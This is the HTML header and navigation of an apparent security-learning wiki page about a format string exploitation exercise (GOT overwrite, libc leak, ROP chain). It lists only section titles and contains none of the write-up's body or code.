
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Single format string vulnerability exploitation on babyfmt_level10.0 with Partial RELRO + no PIE: GOT overwrite, libc leak, and ROP chain execution.">
      
      
        <meta name="author" content="Ä°smail BOZKURT">
      
      
        <link rel="canonical" href="https://ismailbozkurt.github.io/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/">
      
      
        <link rel="prev" href="../10-Format-String-Attack-Format-String-Attack-Once/">
      
      
        <link rel="next" href="../12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/">
      
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Format String Attack - Format String Attack Once (Partial RELRO + no PIE) - Dreamer's Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../custom.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Format String Attack - Format String Attack Once (Partial RELRO + no PIE) - Dreamer's Wiki" >
      
        <meta  property="og:description"  content="Single format string vulnerability exploitation on babyfmt_level10.0 with Partial RELRO + no PIE: GOT overwrite, libc leak, and ROP chain execution." >
      
        <meta  property="og:image"  content="https://ismailbozkurt.github.io/Dreamer-Wiki/assets/images/social/Pwn/Linux/Format String Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-(Partial-RELRO+no-PIE).png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://ismailbozkurt.github.io/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Format String Attack - Format String Attack Once (Partial RELRO + no PIE) - Dreamer's Wiki" >
      
        <meta  name="twitter:description"  content="Single format string vulnerability exploitation on babyfmt_level10.0 with Partial RELRO + no PIE: GOT overwrite, libc leak, and ROP chain execution." >
      
        <meta  name="twitter:image"  content="https://ismailbozkurt.github.io/Dreamer-Wiki/assets/images/social/Pwn/Linux/Format String Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-(Partial-RELRO+no-PIE).png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#format-string-attack-format-string-attack-once-partial-relro-no-pie" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="Dreamer&#39;s Wiki" class="md-header__button md-logo" aria-label="Dreamer's Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Dreamer's Wiki
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Format String Attack - Format String Attack Once (Partial RELRO + no PIE)
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="Dreamer&#39;s Wiki" class="md-nav__button md-logo" aria-label="Dreamer's Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Dreamer's Wiki
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Dreamer
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ActiveDirectory
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            ActiveDirectory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../ActiveDirectory/1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../ActiveDirectory/2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    CVE
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../ActiveDirectory/CVE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Index
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Fuzzing
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Fuzzing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Fuzzing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Index
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linux
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            Linux
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Fuzzing/Linux/Fuzzing-environment-setup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker Environment Setup
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Malware
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Malware
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Malware/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Index
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PWN-Index/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PWN Index
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" checked>
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linux
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            Linux
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Environment-setup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker Environment Setup
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2" checked>
        
          
          <label class="md-nav__link" for="__nav_5_2_2" id="__nav_5_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Format String Vulnerabilities
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5_2_2">
            <span class="md-nav__icon md-icon"></span>
            Format String Vulnerabilities
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../01-Introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Format String Vulnerabilities
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../02-Format-String-Attack-The-Stack-Leak-1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    The Stack Leak 1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../03-Format-String-Attack-The-Stack-Leak-2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    The Stack Leak 2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../04-Format-String-Attack-The-BSS-Leak/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    The BSS Leak
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../05-Format-String-Attack-Write-what-where-1-byte/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Write-What-Where - 1 byte
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06-Format-String-Attack-Write-what-where-8-bytes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Write-What-Where - 8 bytes
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../07-Format-String-Attack-printf-Dynamic-padding-size/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Write-What-Where - `printf` Dynamic Padding Size (`*`)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Attack - Redirect Code Execution (GOT Overwrite)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Attack - Redirect Code Execution (Full RELRO + PIE Enabled)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../10-Format-String-Attack-Format-String-Attack-Once/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Attack - Format String Attack Once (Partial RELRO + no PIE)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Format String Attack - Format String Attack Once (Partial RELRO + no PIE)
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Format String Attack - Format String Attack Once (Partial RELRO + no PIE)
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#babyfmt_level100" class="md-nav__link">
    <span class="md-ellipsis">
      babyfmt_level10.0
    </span>
  </a>
  
    <nav class="md-nav" aria-label="babyfmt_level10.0">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-offset-and-padlen-values" class="md-nav__link">
    <span class="md-ellipsis">
      find offset and padlen values
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write-exit-got-entry-func-address" class="md-nav__link">
    <span class="md-ellipsis">
      Write exit got entry -&gt; func address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leak-libc-address-write23" class="md-nav__link">
    <span class="md-ellipsis">
      Leak LIBC Address (write+23)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-suitable-writable-memory-map-bss" class="md-nav__link">
    <span class="md-ellipsis">
      Finding suitable writable memory map (bss)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#controlling-rip-register" class="md-nav__link">
    <span class="md-ellipsis">
      Controlling RIP Register
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get_flagpy" class="md-nav__link">
    <span class="md-ellipsis">
      get_flag.py
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
